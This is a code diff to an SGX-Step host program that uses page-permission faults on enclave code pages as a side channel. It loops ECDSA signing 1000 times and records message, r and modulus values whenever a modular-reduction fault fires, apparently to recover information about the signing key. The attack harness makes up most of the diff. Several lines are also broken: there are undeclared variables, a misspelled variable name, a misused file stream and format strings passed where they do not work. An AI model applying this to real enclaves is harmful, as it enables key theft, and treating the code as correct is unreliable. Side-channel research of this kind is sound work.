@@ -27,6 +27,8 @@
 #include "libsgxstep/pt.h"
 #include <stdbool.h>
 #include <time.h>
+#include <iostream>
+#include <fstream>
 
 unsigned long int Q = 100003;
 
@@ -40,6 +42,7 @@ int fault_fired = 0, aep_fired = 0;
 
 bool add_caught = false;
 bool mod_caught = false;
+bool greater_than_q = false;
 
 void aep_cb_func(void)
 {
@@ -55,25 +58,17 @@ void fault_handler(int signal)
         printf("Caught fault %d corresponding add operation.\n", signal);
         printf("Restoring add access rights and revoking access to mod_overflow\n");
         add_caught = true;
-	printf("add\n");
-	print_pte_adrs(add_ptr);
         ASSERT(!mprotect(add_ptr, 4096, PROT_READ | PROT_WRITE));
         ASSERT(!mprotect(mod_ptr, 4096, PROT_NONE));
-	printf("add_restored\n");
-	print_pte_adrs(add_ptr);
+        printf("add_restored\n");
+        print_pte_adrs(add_ptr);
     } else {
         printf("Caught fault %d corresponding mod_overflow operation.\n", signal);
-	printf("mod_ptr\n");
-	print_pte_adrs(mod_ptr);
-	
-        printf("Restoring access rights\n");
+        printf("Restoring access rights of div_rem\n");
+        greater_than_q = true;
         ASSERT(!mprotect(add_ptr, 4096, PROT_READ | PROT_WRITE));
         ASSERT(!mprotect(mod_ptr, 4096, PROT_READ | PROT_WRITE));
-        printf("mod not blocked anymore\n");
-	printf("mod_ptr\n");
-	print_pte_adrs(mod_ptr);
-	printf("add_ptr_mod\n");
-	print_pte_adrs(add_ptr);
+        print_pte_adrs(mod_ptr);
     }
     
     fault_fired++;
@@ -119,11 +114,6 @@ int main( int argc, char **argv )
     ASSERT(!mprotect(add_ptr, 4096, PROT_READ | PROT_WRITE));
     ASSERT(!mprotect(mod_ptr, 4096, PROT_READ | PROT_WRITE));
     
-    printf("Faulting on add operation at %p\n", add_ptr);
-    // print_pte_adrs(add_ptr);
-    ASSERT(!mprotect(add_ptr, 4096, PROT_NONE));
-    print_pte_adrs(add_ptr);
-    
     printf("Will fault on mod_overflow operation once add is called \n");
     print_pte_adrs(mod_ptr);
     // ASSERT(!mprotect(mod_ptr, 4096, PROT_NONE));
@@ -136,13 +126,37 @@ int main( int argc, char **argv )
 
     char sign_array[2] = "ec";
     unsigned long int message_by2 = Q / 2;
-    unsigned long int return_v;
-    unsigned long r = ECDSA_sign(eid, &return_v, message_by2);
 
-    
-    printf("value of m =q/2 =%lu\n", message_by2);
-    printf("value of r =%lu\n", return_v);
-    printf("value of q = %lu\n", Q);
+
+    int i;
+    unsigned long int return_v = NULL;
+    ofstream myfile; // http://www.cplusplus.com/doc/tutorial/files/
+
+    time_t timer;
+    timer = time(NULL);
+    seconds = difftime(timer,mktime(&y2k));
+
+    myfile.open("MRQData%.f.txt", seconds); // http://www.cplusplus.com/reference/ctime/time/
+
+    for (i = 0; i < 1000; i++) {
+        ECDSA_sign(eid, &return_v, message_by2);
+        printf("Faulting on add operation at %p\n", add_ptr);
+        print_pte_adrs(add_ptr);
+        ASSERT(!mprotect(add_ptr, 4096, PROT_NONE));
+
+        printf("value of m =q/2 =%lu\n", message_by2);
+        printf("value of r =%lu\n", return_v);
+        printf("value of q = %lu\n", Q);
+
+        if (greater_than_q) { // if trigger was called twice
+            myfile << ("%lu:%lu:%lu", message_by_2, return_v, Q); // M, R, Q
+        }
+
+        greater_than_q = false;
+
+    }
+    myfile.close();
+
     ASSERT(fault_fired && aep_fired);
    	SGX_ASSERT( sgx_destroy_enclave( eid ) );
 
